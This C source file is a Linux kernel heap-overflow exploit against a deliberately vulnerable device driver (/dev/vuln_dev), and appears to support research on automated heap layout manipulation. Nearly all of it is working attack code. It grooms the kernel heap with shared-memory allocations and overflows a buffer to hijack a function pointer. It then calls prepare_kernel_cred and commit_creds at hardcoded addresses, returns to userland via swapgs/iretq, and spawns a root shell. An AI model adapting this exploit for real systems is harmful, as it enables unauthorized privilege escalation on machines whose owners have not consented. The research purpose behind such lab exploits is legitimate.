#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <memory.h>
#include <sys/shm.h>
#include <sched.h>

#define VULN_ALLOC_TARGET 1001
#define VULN_ALLOC_OVERFLOW 1002
#define VULN_CALL 1003
#define VULN_COPY_TO_BUF 1004
#define VULN_PRINT_BUF 1005
#define VULN_DEBUG 1006

#define DEVICE_PATH "/dev/vuln_dev"
#define TESTSTRING "This is a test."

#define BUFSIZE 256

typedef struct vuln_params {
    char *input;
    size_t len;
} vuln_params_t;

char *repeatStr(char *str, size_t count) {
    if (count == 0) return NULL;
    char *ret = malloc(strlen (str) * count + count);
    if (ret == NULL) return NULL;
    strcpy (ret, str);
    while (--count > 0) {
        strcat (ret, str);
    }
    return ret;
}

//bind thread to single cpu, taken from Attacking the core book
static int bindcpu() {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
        perror("setaffinity");
        return (-1);
    }
    return (0);
}

char get_byte(unsigned long address, size_t n){
   return (char) (address >> (8*n)) & 0xff;
}

void shm_kern_alloc(unsigned kmalloc_size, unsigned num){
    int i = 0;
    int *shmids;
    shmids = malloc(num * sizeof(int));
    for(i=0; i<num; i++){
		shmids[i] = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
    }
    return;
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

/*
Update the adresses of prepare_kernel_cred and commit_creds with the current running kernel. 
In a real exploit these adresses should be resolved dynamically, but here we want to focus on the algorithmic heap layout manipulation.

$ sudo grep "T commit_creds" /proc/kallsyms
ffffffffb16effc0 T commit_creds 
sudo grep "T prepare_kernel_cred" /proc/kallsyms
ffffffffb16f0290 T prepare_kernel_cred
*/
unsigned long user_rip = (unsigned long)get_shell;
void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff810b3300;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff810b2f80;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}



void print_hex(const char *array, int len)
{
    unsigned char *p = (unsigned char *) array;

    for (int i=0; i < len; ++i) {
        if (! (i % 16) && i)
                printf("\n");
        printf("0x%02x ", p[i]);
    }
    printf("\n\n");
}

char *preparePayload(){
    char *payload = repeatStr("A", 256);
    // Payload contains 256 "A", followed by the address of the target function
    payload = (char*) realloc(payload, 270);
    void (*target_ptr)() = escalate_privs;
    unsigned long target_addr = (unsigned long) target_ptr;
    payload[256] = get_byte(target_addr, 0); 
    payload[257] = get_byte(target_addr, 1); 
    payload[258] = get_byte(target_addr, 2); 
    payload[259] = get_byte(target_addr, 3); 
    payload[260] = get_byte(target_addr, 4); 
    payload[261] = get_byte(target_addr, 5); 
    payload[262] = get_byte(target_addr, 6); 
    payload[263] = get_byte(target_addr, 7); 
    return payload;
}

/*
The content of this function should be replaced by the solution from KEvoHeap.
Keep in mind that the error checks are not automatically generated by KEvoHeap.
*/
void do_heap_layout_manipulation(int fd){
    // Make two allocations 
    int fengshui1 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
    int fengshui2 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
    // Allocate overflow
    ioctl(fd, VULN_ALLOC_OVERFLOW);
    // Free the first two allocations
    if(shmctl(fengshui1, IPC_RMID, NULL) != 0){
        perror("Failed to remove shm:");
        exit(1);
    }
    if(shmctl(fengshui2, IPC_RMID, NULL) != 0){
        perror("Failed to remove shm:");
        exit(1);
    }
    // Sleep for removes to go through
    sleep(1);
    // Allocate target
    ioctl(fd, VULN_ALLOC_TARGET);
}

int main(){
    // Bind process to one core
    bindcpu(); 
    // Save register state
    save_state();
    // Open vulnerable device
    int fd = open(DEVICE_PATH, O_RDONLY); 
    // Remove all shm's
    system("for shmid in `cat /proc/sysvipc/shm | awk '{print $2}'`; do ipcrm -m $shmid > /dev/null 2>&1; done;");
    // Defragmentation
    shm_kern_alloc(256, 50);

    do_heap_layout_manipulation(fd);



    //Prepare the payload
    vuln_params_t vuln_params;
    char *payload = preparePayload();
    printf("[*] Payload prepared:\n");
    print_hex(payload, 264);
    vuln_params.len = 264;
    printf("[*] Target address: %p\n", escalate_privs);
    vuln_params.input = malloc(vuln_params.len * sizeof(char));
    strcpy(vuln_params.input, payload);

    // Trigger the overflow
    ioctl(fd, VULN_COPY_TO_BUF, &vuln_params);
    ioctl(fd, VULN_CALL);


    //printf("[*] If you can read this, you failed!\n");
    //ioctl(fd, VULN_PRINT_BUF);
    //ioctl(fd, VULN_DEBUG);
    //close(fd);
    //free(vuln_params.input);
    return 0;
}
